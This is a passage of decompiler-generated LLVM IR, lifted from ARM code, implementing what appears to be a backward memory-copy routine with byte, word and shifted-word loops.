
bb149:                                            ; preds = %dec_label_pc_18f2c
  %v10_18f38 = add i32 %v6_18f30, -8
  %v11_18f38 = inttoptr i32 %v10_18f38 to i32*
  %v12_18f38 = load i32, i32* %v11_18f38, align 4
  store i32 %v12_18f38, i32* @ip, align 4
  store i32 %v10_18f38, i32* %r1.global-to-local, align 4
  %v7_18f3c = add i32 %v7_18f34, -8
  %v8_18f3c = inttoptr i32 %v7_18f3c to i32*
  store i32 %v9_18f30, i32* %v8_18f3c, align 4
  %v10_18f3c = add i32 %v7_18f34, -4
  %v11_18f3c = inttoptr i32 %v10_18f3c to i32*
  %v12_18f3c = load i32, i32* @ip, align 4
  store i32 %v12_18f3c, i32* %v11_18f3c, align 4
  store i32 %v7_18f3c, i32* %r0.global-to-local, align 4
  %v6_18f40 = load i32, i32* %r2.global-to-local, align 4
  %v7_18f40 = add i32 %v6_18f40, -4
  store i32 %v7_18f40, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %.thread8, %.thread14, %dec_label_pc_18f24, %dec_label_pc_18eb4, %dec_label_pc_190e8, %dec_label_pc_1907c, %dec_label_pc_19010, %bb149
  %v2_18f48 = phi i32 [ %v11_18f34, %.thread8 ], [ %v0_18fe020, %.thread14 ], [ %v7_18f34, %dec_label_pc_18f24 ], [ %v2_18eb8, %dec_label_pc_18eb4 ], [ %v2_18f5453, %dec_label_pc_190e8 ], [ %v2_18f5452, %dec_label_pc_1907c ], [ %v2_18f5451, %dec_label_pc_19010 ], [ %v7_18f3c, %bb149 ]
  %v0_18f44 = phi i32 [ %v0_18f44.pre, %.thread8 ], [ %v2_18f88, %.thread14 ], [ %v2_18f24, %dec_label_pc_18f24 ], [ %v2_18ebc, %dec_label_pc_18eb4 ], [ %v0_18f4449, %dec_label_pc_190e8 ], [ %v0_18f4448, %dec_label_pc_1907c ], [ %v0_18f4447, %dec_label_pc_19010 ], [ %v7_18f40, %bb149 ]
  %v1_18f44 = add i32 %v0_18f44, 4
  store i32 %v1_18f44, i32* %r2.global-to-local, align 4
  %v3_18f44 = sub i32 0, %v0_18f44
  %v4_18f44 = and i32 %v1_18f44, %v3_18f44
  %v5_18f44 = icmp slt i32 %v4_18f44, 0
  store i1 %v5_18f44, i1* %cpsr_v.global-to-local, align 1
  %v6_18f44 = icmp slt i32 %v1_18f44, 0
  store i1 %v6_18f44, i1* %cpsr_n.global-to-local, align 1
  %v7_18f44 = icmp eq i32 %v1_18f44, 0
  store i1 %v7_18f44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18f44, label %.thread130, label %bb151

bb151:                                            ; preds = %bb150
  %v1_18f4c = add i32 %v0_18f44, 2
  %v3_18f4c = sub i32 -3, %v0_18f44
  %v4_18f4c = and i32 %v3_18f4c, %v1_18f44
  %v5_18f4c = icmp slt i32 %v4_18f4c, 0
  store i1 %v5_18f4c, i1* %cpsr_v.global-to-local, align 1
  %v6_18f4c = icmp slt i32 %v1_18f4c, 0
  store i1 %v6_18f4c, i1* %cpsr_n.global-to-local, align 1
  %v7_18f4c = icmp eq i32 %v1_18f44, 2
  store i1 %v7_18f4c, i1* %cpsr_z.global-to-local, align 1
  %v0_18f50 = load i32, i32* %r1.global-to-local, align 4
  %v1_18f50 = add i32 %v0_18f50, -1
  %v2_18f50 = inttoptr i32 %v1_18f50 to i8*
  %v3_18f50 = load i8, i8* %v2_18f50, align 1
  %v4_18f50 = zext i8 %v3_18f50 to i32
  store i32 %v4_18f50, i32* @r3, align 4
  store i32 %v1_18f50, i32* %r1.global-to-local, align 4
  %v3_18f54 = add i32 %v2_18f48, -1
  %v4_18f54 = inttoptr i32 %v3_18f54 to i8*
  store i8 %v3_18f50, i8* %v4_18f54, align 1
  %v5_18f54 = load i32, i32* %r0.global-to-local, align 4
  %v6_18f54 = add i32 %v5_18f54, -1
  store i32 %v6_18f54, i32* %r0.global-to-local, align 4
  %v0_18f58 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_18f58 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_18f58 = xor i1 %v0_18f58, %v1_18f58
  br i1 %v2_18f58, label %.thread129, label %bb152

bb152:                                            ; preds = %bb151
  %v3_18f58 = load i32, i32* %r1.global-to-local, align 4
  %v4_18f58 = add i32 %v3_18f58, -1
  %v5_18f58 = inttoptr i32 %v4_18f58 to i8*
  %v6_18f58 = load i8, i8* %v5_18f58, align 1
  %v7_18f58 = zext i8 %v6_18f58 to i32
  store i32 %v7_18f58, i32* @r3, align 4
  store i32 %v4_18f58, i32* %r1.global-to-local, align 4
  %v6_18f5c = add i32 %v5_18f54, -2
  %v7_18f5c = inttoptr i32 %v6_18f5c to i8*
  store i8 %v6_18f58, i8* %v7_18f5c, align 1
  %v8_18f5c = load i32, i32* %r0.global-to-local, align 4
  %v9_18f5c = add i32 %v8_18f5c, -1
  store i32 %v9_18f5c, i32* %r0.global-to-local, align 4
  %v1_18f60.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_18f60.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread129

.thread129:                                       ; preds = %bb151, %bb152
  %v7_18f64 = phi i32 [ %v9_18f5c, %bb152 ], [ %v6_18f54, %bb151 ]
  %v2_18f64 = phi i1 [ %v2_18f60.pre, %bb152 ], [ %v1_18f58, %bb151 ]
  %v1_18f64 = phi i1 [ %v1_18f60.pre, %bb152 ], [ %v0_18f58, %bb151 ]
  %v0_18f60 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_18f60 = xor i1 %v2_18f64, %v1_18f64
  %v4_18f60 = or i1 %v0_18f60, %v3_18f60
  br i1 %v4_18f60, label %.thread130, label %bb153

bb153:                                            ; preds = %.thread129
  %v5_18f60 = load i32, i32* %r1.global-to-local, align 4
  %v6_18f60 = add i32 %v5_18f60, -1
  %v7_18f60 = inttoptr i32 %v6_18f60 to i8*
  %v8_18f60 = load i8, i8* %v7_18f60, align 1
  %v9_18f60 = zext i8 %v8_18f60 to i32
  store i32 %v9_18f60, i32* @r3, align 4
  store i32 %v6_18f60, i32* %r1.global-to-local, align 4
  %v8_18f64 = add i32 %v7_18f64, -1
  %v9_18f64 = inttoptr i32 %v8_18f64 to i8*
  store i8 %v8_18f60, i8* %v9_18f64, align 1
  %v10_18f64 = load i32, i32* %r0.global-to-local, align 4
  %v11_18f64 = add i32 %v10_18f64, -1
  store i32 %v11_18f64, i32* %r0.global-to-local, align 4
  br label %.thread130

dec_label_pc_18f6c:                               ; preds = %dec_label_pc_18ec4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_18f6c = icmp eq i32 %v1_18ec4, 1
  store i1 %v8_18f6c, i1* %cpsr_n.global-to-local, align 1
  %v9_18f6c = icmp eq i32 %v1_18ec4, 2
  store i1 %v9_18f6c, i1* %cpsr_z.global-to-local, align 1
  %v1_18f70 = add i32 %v2_18eb4, -1
  %v2_18f70 = inttoptr i32 %v1_18f70 to i8*
  %v3_18f70 = load i8, i8* %v2_18f70, align 1
  %v4_18f70 = zext i8 %v3_18f70 to i32
  store i32 %v4_18f70, i32* @r3, align 4
  store i32 %v1_18f70, i32* %r1.global-to-local, align 4
  %v3_18f74 = add i32 %v2_18eb8, -1
  %v4_18f74 = inttoptr i32 %v3_18f74 to i8*
  store i8 %v3_18f70, i8* %v4_18f74, align 1
  %v5_18f74 = load i32, i32* %r0.global-to-local, align 4
  %v6_18f74 = add i32 %v5_18f74, -1
  store i32 %v6_18f74, i32* %r0.global-to-local, align 4
  br i1 %v8_18f6c, label %.thread14, label %bb154

bb154:                                            ; preds = %dec_label_pc_18f6c
  %v6_18f78 = load i32, i32* %r1.global-to-local, align 4
  %v7_18f78 = add i32 %v6_18f78, -1
  %v8_18f78 = inttoptr i32 %v7_18f78 to i8*
  %v9_18f78 = load i8, i8* %v8_18f78, align 1
  %v10_18f78 = zext i8 %v9_18f78 to i32
  store i32 %v10_18f78, i32* @r3, align 4
  store i32 %v7_18f78, i32* %r1.global-to-local, align 4
  %v9_18f7c = add i32 %v5_18f74, -2
  %v10_18f7c = inttoptr i32 %v9_18f7c to i8*
  store i8 %v9_18f78, i8* %v10_18f7c, align 1
  %v11_18f7c = load i32, i32* %r0.global-to-local, align 4
  %v12_18f7c = add i32 %v11_18f7c, -1
  store i32 %v12_18f7c, i32* %r0.global-to-local, align 4
  br i1 %v9_18f6c, label %.thread14, label %bb155

bb155:                                            ; preds = %bb154
  %v8_18f80 = load i32, i32* %r1.global-to-local, align 4
  %v9_18f80 = add i32 %v8_18f80, -1
  %v10_18f80 = inttoptr i32 %v9_18f80 to i8*
  %v11_18f80 = load i8, i8* %v10_18f80, align 1
  %v12_18f80 = zext i8 %v11_18f80 to i32
  store i32 %v12_18f80, i32* @r3, align 4
  store i32 %v9_18f80, i32* %r1.global-to-local, align 4
  %v11_18f84 = add i32 %v11_18f7c, -2
  %v12_18f84 = inttoptr i32 %v11_18f84 to i8*
  store i8 %v11_18f80, i8* %v12_18f84, align 1
  %v13_18f84 = load i32, i32* %r0.global-to-local, align 4
  %v14_18f84 = add i32 %v13_18f84, -1
  store i32 %v14_18f84, i32* %r0.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %bb154, %dec_label_pc_18f6c, %bb155
  %v0_18fe020 = phi i32 [ %v12_18f7c, %bb154 ], [ %v6_18f74, %dec_label_pc_18f6c ], [ %v14_18f84, %bb155 ]
  %v0_18f88 = load i32, i32* %r2.global-to-local, align 4
  %v1_18f88 = load i32, i32* @ip, align 4
  %v2_18f88 = sub i32 %v0_18f88, %v1_18f88
  store i32 %v2_18f88, i32* %r2.global-to-local, align 4
  %v4_18f88 = xor i32 %v1_18f88, %v0_18f88
  %v5_18f88 = xor i32 %v2_18f88, %v0_18f88
  %v6_18f88 = and i32 %v5_18f88, %v4_18f88
  %v7_18f88 = icmp slt i32 %v6_18f88, 0
  store i1 %v7_18f88, i1* %cpsr_v.global-to-local, align 1
  %v8_18f88 = icmp slt i32 %v2_18f88, 0
  store i1 %v8_18f88, i1* %cpsr_n.global-to-local, align 1
  %v9_18f88 = icmp eq i32 %v0_18f88, %v1_18f88
  store i1 %v9_18f88, i1* %cpsr_z.global-to-local, align 1
  %v5_18f8c = icmp slt i32 %v0_18f88, %v1_18f88
  br i1 %v5_18f8c, label %bb150, label %dec_label_pc_18f90

dec_label_pc_18f90:                               ; preds = %.thread14
  %v0_18f90 = load i32, i32* %r1.global-to-local, align 4
  %v1_18f90 = urem i32 %v0_18f90, 4
  store i32 %v1_18f90, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18f90 = icmp eq i32 %v1_18f90, 0
  store i1 %v2_18f90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18f90, label %dec_label_pc_18ed4, label %dec_label_pc_18f98

dec_label_pc_18f98:                               ; preds = %dec_label_pc_18ecc, %dec_label_pc_18f90
  %v0_18fe019 = phi i32 [ %v2_18eb8, %dec_label_pc_18ecc ], [ %v0_18fe020, %dec_label_pc_18f90 ]
  %v0_1908c = phi i32 [ %v2_18ebc, %dec_label_pc_18ecc ], [ %v2_18f88, %dec_label_pc_18f90 ]
  %v0_18f98 = phi i32 [ %v2_18eb4, %dec_label_pc_18ecc ], [ %v0_18f90, %dec_label_pc_18f90 ]
  %v0_18fa0 = phi i32 [ %v1_18ecc, %dec_label_pc_18ecc ], [ %v1_18f90, %dec_label_pc_18f90 ]
  %v1_18f98 = and i32 %v0_18f98, -4
  store i32 %v1_18f98, i32* %r1.global-to-local, align 4
  %v1_18f9c = inttoptr i32 %v1_18f98 to i32*
  %v2_18f9c = load i32, i32* %v1_18f9c, align 4
  store i32 %v2_18f9c, i32* @r3, align 4
  %v7_18fa0 = icmp ult i32 %v0_18fa0, 2
  %v2_19084 = add i32 %v0_1908c, -12
  %v4_19084 = sub i32 11, %v0_1908c
  %v5_19084 = and i32 %v4_19084, %v0_1908c
  %v6_19084 = icmp slt i32 %v5_19084, 0
  store i1 %v6_19084, i1* %cpsr_v.global-to-local, align 1
  %v7_19084 = icmp slt i32 %v2_19084, 0
  store i1 %v7_19084, i1* %cpsr_n.global-to-local, align 1
  %v8_19084 = icmp eq i32 %v0_1908c, 12
  store i1 %v8_19084, i1* %cpsr_z.global-to-local, align 1
  %v5_19088 = icmp slt i32 %v0_1908c, 12
  br i1 %v7_18fa0, label %dec_label_pc_19084, label %dec_label_pc_18fa8

dec_label_pc_18fa8:                               ; preds = %dec_label_pc_18f98
  %v8_18fa0 = icmp eq i32 %v0_18fa0, 2
  br i1 %v8_18fa0, label %dec_label_pc_19018, label %dec_label_pc_18fac

dec_label_pc_18fac:                               ; preds = %dec_label_pc_18fa8
  br i1 %v5_19088, label %dec_label_pc_18ff8, label %dec_label_pc_18fb4

dec_label_pc_18fb4:                               ; preds = %dec_label_pc_18fac
  store i32 %v2_19084, i32* %r2.global-to-local, align 4
  %v3_18fb8 = load i32, i32* @r4, align 4
  store i32 %v3_18fb8, i32* %stack_var_-12, align 4
  %v6_18fb8 = load i32, i32* @r5, align 4
  %v8_18fb8 = inttoptr i32 %v6_18fb8 to i8*
  store i8* %v8_18fb8, i8** %stack_var_-8, align 4
  %v11_18fb8 = load i32, i32* @lr, align 4
  br label %dec_label_pc_18fbc

dec_label_pc_18fbc:                               ; preds = %dec_label_pc_18fbc.dec_label_pc_18fbc_crit_edge, %dec_label_pc_18fb4
  %v0_18fe0 = phi i32 [ %v1_18fe0, %dec_label_pc_18fbc.dec_label_pc_18fbc_crit_edge ], [ %v0_18fe019, %dec_label_pc_18fb4 ]
  %v0_18fc0 = phi i32 [ %v0_18fc0.pre, %dec_label_pc_18fbc.dec_label_pc_18fbc_crit_edge ], [ %v1_18f98, %dec_label_pc_18fb4 ]
  %v0_18fbc = phi i32 [ %v0_18fbc.pre, %dec_label_pc_18fbc.dec_label_pc_18fbc_crit_edge ], [ %v2_18f9c, %dec_label_pc_18fb4 ]
  %v3_18fbc = mul i32 %v0_18fbc, 256
  store i32 %v3_18fbc, i32* %lr.global-to-local, align 4
  %v1_18fc0 = add i32 %v0_18fc0, -4
  %v2_18fc0 = inttoptr i32 %v1_18fc0 to i32*
  %v3_18fc0 = load i32, i32* %v2_18fc0, align 4
  store i32 %v3_18fc0, i32* @r3, align 4
  %v4_18fc0 = add i32 %v0_18fc0, -8
  %v5_18fc0 = inttoptr i32 %v4_18fc0 to i32*
  %v6_18fc0 = load i32, i32* %v5_18fc0, align 4
  store i32 %v6_18fc0, i32* %r4.global-to-local, align 4
  %v7_18fc0 = add i32 %v0_18fc0, -12
  %v8_18fc0 = inttoptr i32 %v7_18fc0 to i32*
  %v9_18fc0 = load i32, i32* %v8_18fc0, align 4
  store i32 %v9_18fc0, i32* %r5.global-to-local, align 4
  %v10_18fc0 = add i32 %v0_18fc0, -16
  %v11_18fc0 = inttoptr i32 %v10_18fc0 to i32*
  %v12_18fc0 = load i32, i32* %v11_18fc0, align 4
  store i32 %v10_18fc0, i32* %r1.global-to-local, align 4
  %v4_18fc4 = udiv i32 %v12_18fc0, 16777216
  %v5_18fc4 = or i32 %v4_18fc4, %v3_18fbc
  store i32 %v5_18fc4, i32* %lr.global-to-local, align 4
  %v3_18fc8 = mul i32 %v12_18fc0, 256
  %v4_18fcc = udiv i32 %v9_18fc0, 16777216
  %v5_18fcc = or i32 %v3_18fc8, %v4_18fcc
  store i32 %v5_18fcc, i32* @ip, align 4
  %v3_18fd0 = mul i32 %v9_18fc0, 256
  %v4_18fd4 = udiv i32 %v6_18fc0, 16777216
  %v5_18fd4 = or i32 %v3_18fd0, %v4_18fd4
  store i32 %v5_18fd4, i32* %r5.global-to-local, align 4
  %v3_18fd8 = mul i32 %v6_18fc0, 256
  %v4_18fdc = udiv i32 %v3_18fc0, 16777216
  %v5_18fdc = or i32 %v3_18fd8, %v4_18fdc
  store i32 %v5_18fdc, i32* %r4.global-to-local, align 4
  %v1_18fe0 = add i32 %v0_18fe0, -16
  %v2_18fe0 = inttoptr i32 %v1_18fe0 to i32*
  store i32 %v5_18fdc, i32* %v2_18fe0, align 4
  %v4_18fe0 = add i32 %v0_18fe0, -12
  %v5_18fe0 = inttoptr i32 %v4_18fe0 to i32*
  %v6_18fe0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_18fe0, i32* %v5_18fe0, align 4
  %v7_18fe0 = add i32 %v0_18fe0, -8
  %v8_18fe0 = inttoptr i32 %v7_18fe0 to i32*
  %v9_18fe0 = load i32, i32* @ip, align 4
  store i32 %v9_18fe0, i32* %v8_18fe0, align 4
  %v10_18fe0 = add i32 %v0_18fe0, -4
  %v11_18fe0 = inttoptr i32 %v10_18fe0 to i32*
  %v12_18fe0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_18fe0, i32* %v11_18fe0, align 4
  store i32 %v1_18fe0, i32* %r0.global-to-local, align 4
  %v0_18fe4 = load i32, i32* %r2.global-to-local, align 4
  %v2_18fe4 = add i32 %v0_18fe4, -16
  store i32 %v2_18fe4, i32* %r2.global-to-local, align 4
  %v6_18fe8 = icmp slt i32 %v0_18fe4, 16
  br i1 %v6_18fe8, label %dec_label_pc_18fec, label %dec_label_pc_18fbc.dec_label_pc_18fbc_crit_edge

dec_label_pc_18fbc.dec_label_pc_18fbc_crit_edge:  ; preds = %dec_label_pc_18fbc
  %v0_18fbc.pre = load i32, i32* @r3, align 4
  %v0_18fc0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18fbc

dec_label_pc_18fec:                               ; preds = %dec_label_pc_18fbc
  %v2_18fec = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18fec, i32* @r4, align 4
  %v5_18fec = load i8*, i8** %stack_var_-8, align 4
  %v6_18fec = ptrtoint i8* %v5_18fec to i32
  store i32 %v6_18fec, i32* @r5, align 4
  store i32 %v11_18fb8, i32* @lr, align 4
  %v2_18ff0 = add i32 %v0_18fe4, -4
  store i32 %v2_18ff0, i32* %r2.global-to-local, align 4
  %v4_18ff0 = add i32 %v0_18fe4, 2147483632
  %v5_18ff0 = and i32 %v2_18ff0, %v4_18ff0
  %v6_18ff0 = icmp slt i32 %v5_18ff0, 0
  store i1 %v6_18ff0, i1* %cpsr_v.global-to-local, align 1
  %v7_18ff0 = icmp slt i32 %v2_18ff0, 0
  store i1 %v7_18ff0, i1* %cpsr_n.global-to-local, align 1
  %v8_18ff0 = icmp eq i32 %v2_18ff0, 0
  store i1 %v8_18ff0, i1* %cpsr_z.global-to-local, align 1
  %v5_18ff4 = icmp slt i32 %v2_18fe4, -12
  br i1 %v5_18ff4, label %dec_label_pc_19010, label %dec_label_pc_18ff8

dec_label_pc_18ff8:                               ; preds = %dec_label_pc_18fec, %dec_label_pc_18fac, %dec_label_pc_18ff8
  %v1_19004 = phi i32 [ %v5_19004, %dec_label_pc_18ff8 ], [ %v1_18fe0, %dec_label_pc_18fec ], [ %v0_18fe019, %dec_label_pc_18fac ]
  %v0_18ff8 = load i32, i32* @r3, align 4
  %v3_18ff8 = mul i32 %v0_18ff8, 256
  store i32 %v3_18ff8, i32* %ip.global-to-local, align 4
  %v0_18ffc = load i32, i32* %r1.global-to-local, align 4
  %v1_18ffc = add i32 %v0_18ffc, -4
  %v2_18ffc = inttoptr i32 %v1_18ffc to i32*
  %v3_18ffc = load i32, i32* %v2_18ffc, align 4
  store i32 %v3_18ffc, i32* @r3, align 4
  store i32 %v1_18ffc, i32* %r1.global-to-local, align 4
  %v4_19000 = udiv i32 %v3_18ffc, 16777216
  %v5_19000 = or i32 %v4_19000, %v3_18ff8
  store i32 %v5_19000, i32* @ip, align 4
  %v2_19004 = add i32 %v1_19004, -4
  %v3_19004 = inttoptr i32 %v2_19004 to i32*
  store i32 %v5_19000, i32* %v3_19004, align 4
  %v4_19004 = load i32, i32* %r0.global-to-local, align 4
  %v5_19004 = add i32 %v4_19004, -4
  store i32 %v5_19004, i32* %r0.global-to-local, align 4
  %v0_19008 = load i32, i32* %r2.global-to-local, align 4
  %v2_19008 = add i32 %v0_19008, -4
  store i32 %v2_19008, i32* %r2.global-to-local, align 4
  %v6_1900c = icmp slt i32 %v0_19008, 4
  br i1 %v6_1900c, label %dec_label_pc_19010.loopexit, label %dec_label_pc_18ff8

dec_label_pc_19010.loopexit:                      ; preds = %dec_label_pc_18ff8
  %v4_19008 = sub i32 3, %v0_19008
  %v5_19008 = and i32 %v4_19008, %v0_19008
  %v6_19008 = icmp slt i32 %v5_19008, 0
  %v7_19008 = icmp slt i32 %v2_19008, 0
  store i1 %v6_19008, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_19008, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_19010

dec_label_pc_19010:                               ; preds = %dec_label_pc_19010.loopexit, %dec_label_pc_18fec
  %v2_18f5451 = phi i32 [ %v5_19004, %dec_label_pc_19010.loopexit ], [ %v1_18fe0, %dec_label_pc_18fec ]
  %v0_18f4447 = phi i32 [ %v2_19008, %dec_label_pc_19010.loopexit ], [ %v2_18ff0, %dec_label_pc_18fec ]
  %v0_19010 = load i32, i32* %r1.global-to-local, align 4
  %v1_19010 = add i32 %v0_19010, 3
  store i32 %v1_19010, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_19018:                               ; preds = %dec_label_pc_18fa8
  br i1 %v5_19088, label %dec_label_pc_19064, label %dec_label_pc_19020

dec_label_pc_19020:                               ; preds = %dec_label_pc_19018
  store i32 %v2_19084, i32* %r2.global-to-local, align 4
  %v3_19024 = load i32, i32* @r4, align 4
  store i32 %v3_19024, i32* %stack_var_-12, align 4
  %v6_19024 = load i32, i32* @r5, align 4
  %v8_19024 = inttoptr i32 %v6_19024 to i8*
  store i8* %v8_19024, i8** %stack_var_-8, align 4
  %v11_19024 = load i32, i32* @lr, align 4
  br label %dec_label_pc_19028

dec_label_pc_19028:                               ; preds = %dec_label_pc_19028.dec_label_pc_19028_crit_edge, %dec_label_pc_19020
  %v0_1904c = phi i32 [ %v1_1904c, %dec_label_pc_19028.dec_label_pc_19028_crit_edge ], [ %v0_18fe019, %dec_label_pc_19020 ]
  %v0_1902c = phi i32 [ %v0_1902c.pre, %dec_label_pc_19028.dec_label_pc_19028_crit_edge ], [ %v1_18f98, %dec_label_pc_19020 ]
  %v0_19028 = phi i32 [ %v0_19028.pre, %dec_label_pc_19028.dec_label_pc_19028_crit_edge ], [ %v2_18f9c, %dec_label_pc_19020 ]
  %v3_19028 = mul i32 %v0_19028, 65536
  store i32 %v3_19028, i32* %lr.global-to-local, align 4
  %v1_1902c = add i32 %v0_1902c, -4
  %v2_1902c = inttoptr i32 %v1_1902c to i32*
  %v3_1902c = load i32, i32* %v2_1902c, align 4
  store i32 %v3_1902c, i32* @r3, align 4
  %v4_1902c = add i32 %v0_1902c, -8
  %v5_1902c = inttoptr i32 %v4_1902c to i32*
  %v6_1902c = load i32, i32* %v5_1902c, align 4
  store i32 %v6_1902c, i32* %r4.global-to-local, align 4
  %v7_1902c = add i32 %v0_1902c, -12
  %v8_1902c = inttoptr i32 %v7_1902c to i32*
  %v9_1902c = load i32, i32* %v8_1902c, align 4
  store i32 %v9_1902c, i32* %r5.global-to-local, align 4
  %v10_1902c = add i32 %v0_1902c, -16
  %v11_1902c = inttoptr i32 %v10_1902c to i32*
  %v12_1902c = load i32, i32* %v11_1902c, align 4
  store i32 %v10_1902c, i32* %r1.global-to-local, align 4
  %v4_19030 = udiv i32 %v12_1902c, 65536
  %v5_19030 = or i32 %v4_19030, %v3_19028
  store i32 %v5_19030, i32* %lr.global-to-local, align 4
  %v3_19034 = mul i32 %v12_1902c, 65536
  %v4_19038 = udiv i32 %v9_1902c, 65536
  %v5_19038 = or i32 %v3_19034, %v4_19038
  store i32 %v5_19038, i32* @ip, align 4
  %v3_1903c = mul i32 %v9_1902c, 65536
  %v4_19040 = udiv i32 %v6_1902c, 65536
  %v5_19040 = or i32 %v3_1903c, %v4_19040
  store i32 %v5_19040, i32* %r5.global-to-local, align 4
  %v3_19044 = mul i32 %v6_1902c, 65536
  %v4_19048 = udiv i32 %v3_1902c, 65536
  %v5_19048 = or i32 %v3_19044, %v4_19048
  store i32 %v5_19048, i32* %r4.global-to-local, align 4
  %v1_1904c = add i32 %v0_1904c, -16
  %v2_1904c = inttoptr i32 %v1_1904c to i32*
  store i32 %v5_19048, i32* %v2_1904c, align 4
  %v4_1904c = add i32 %v0_1904c, -12
  %v5_1904c = inttoptr i32 %v4_1904c to i32*
  %v6_1904c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_1904c, i32* %v5_1904c, align 4
  %v7_1904c = add i32 %v0_1904c, -8
  %v8_1904c = inttoptr i32 %v7_1904c to i32*
  %v9_1904c = load i32, i32* @ip, align 4
  store i32 %v9_1904c, i32* %v8_1904c, align 4
  %v10_1904c = add i32 %v0_1904c, -4
  %v11_1904c = inttoptr i32 %v10_1904c to i32*
  %v12_1904c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1904c, i32* %v11_1904c, align 4
  store i32 %v1_1904c, i32* %r0.global-to-local, align 4
  %v0_19050 = load i32, i32* %r2.global-to-local, align 4
  %v2_19050 = add i32 %v0_19050, -16
  store i32 %v2_19050, i32* %r2.global-to-local, align 4
  %v6_19054 = icmp slt i32 %v0_19050, 16
  br i1 %v6_19054, label %dec_label_pc_19058, label %dec_label_pc_19028.dec_label_pc_19028_crit_edge

dec_label_pc_19028.dec_label_pc_19028_crit_edge:  ; preds = %dec_label_pc_19028
  %v0_19028.pre = load i32, i32* @r3, align 4
  %v0_1902c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19028

dec_label_pc_19058:                               ; preds = %dec_label_pc_19028
  %v2_19058 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_19058, i32* @r4, align 4
  %v5_19058 = load i8*, i8** %stack_var_-8, align 4
  %v6_19058 = ptrtoint i8* %v5_19058 to i32
  store i32 %v6_19058, i32* @r5, align 4
  store i32 %v11_19024, i32* @lr, align 4
  %v2_1905c = add i32 %v0_19050, -4
  store i32 %v2_1905c, i32* %r2.global-to-local, align 4
  %v4_1905c = add i32 %v0_19050, 2147483632
  %v5_1905c = and i32 %v2_1905c, %v4_1905c
  %v6_1905c = icmp slt i32 %v5_1905c, 0
  store i1 %v6_1905c, i1* %cpsr_v.global-to-local, align 1
  %v7_1905c = icmp slt i32 %v2_1905c, 0
  store i1 %v7_1905c, i1* %cpsr_n.global-to-local, align 1
  %v8_1905c = icmp eq i32 %v2_1905c, 0
  store i1 %v8_1905c, i1* %cpsr_z.global-to-local, align 1
  %v5_19060 = icmp slt i32 %v2_19050, -12
  br i1 %v5_19060, label %dec_label_pc_1907c, label %dec_label_pc_19064

dec_label_pc_19064:                               ; preds = %dec_label_pc_19058, %dec_label_pc_19018, %dec_label_pc_19064
  %v1_19070 = phi i32 [ %v5_19070, %dec_label_pc_19064 ], [ %v1_1904c, %dec_label_pc_19058 ], [ %v0_18fe019, %dec_label_pc_19018 ]
  %v0_19064 = load i32, i32* @r3, align 4
  %v3_19064 = mul i32 %v0_19064, 65536
  store i32 %v3_19064, i32* %ip.global-to-local, align 4
  %v0_19068 = load i32, i32* %r1.global-to-local, align 4
  %v1_19068 = add i32 %v0_19068, -4
  %v2_19068 = inttoptr i32 %v1_19068 to i32*
  %v3_19068 = load i32, i32* %v2_19068, align 4
  store i32 %v3_19068, i32* @r3, align 4
  store i32 %v1_19068, i32* %r1.global-to-local, align 4
  %v4_1906c = udiv i32 %v3_19068, 65536
  %v5_1906c = or i32 %v4_1906c, %v3_19064
  store i32 %v5_1906c, i32* @ip, align 4
  %v2_19070 = add i32 %v1_19070, -4
  %v3_19070 = inttoptr i32 %v2_19070 to i32*
  store i32 %v5_1906c, i32* %v3_19070, align 4
  %v4_19070 = load i32, i32* %r0.global-to-local, align 4
  %v5_19070 = add i32 %v4_19070, -4
  store i32 %v5_19070, i32* %r0.global-to-local, align 4
  %v0_19074 = load i32, i32* %r2.global-to-local, align 4
  %v2_19074 = add i32 %v0_19074, -4
  store i32 %v2_19074, i32* %r2.global-to-local, align 4
  %v6_19078 = icmp slt i32 %v0_19074, 4
  br i1 %v6_19078, label %dec_label_pc_1907c.loopexit, label %dec_label_pc_19064

dec_label_pc_1907c.loopexit:                      ; preds = %dec_label_pc_19064
  %v4_19074 = sub i32 3, %v0_19074
  %v5_19074 = and i32 %v4_19074, %v0_19074
  %v6_19074 = icmp slt i32 %v5_19074, 0
  %v7_19074 = icmp slt i32 %v2_19074, 0
  store i1 %v6_19074, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_19074, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1907c

dec_label_pc_1907c:                               ; preds = %dec_label_pc_1907c.loopexit, %dec_label_pc_19058
  %v2_18f5452 = phi i32 [ %v5_19070, %dec_label_pc_1907c.loopexit ], [ %v1_1904c, %dec_label_pc_19058 ]
  %v0_18f4448 = phi i32 [ %v2_19074, %dec_label_pc_1907c.loopexit ], [ %v2_1905c, %dec_label_pc_19058 ]
  %v0_1907c = load i32, i32* %r1.global-to-local, align 4
  %v1_1907c = add i32 %v0_1907c, 2
  store i32 %v1_1907c, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_19084:                               ; preds = %dec_label_pc_18f98
  br i1 %v5_19088, label %dec_label_pc_190d0, label %dec_label_pc_1908c

dec_label_pc_1908c:                               ; preds = %dec_label_pc_19084
  store i32 %v2_19084, i32* %r2.global-to-local, align 4
  %v3_19090 = load i32, i32* @r4, align 4
  store i32 %v3_19090, i32* %stack_var_-12, align 4
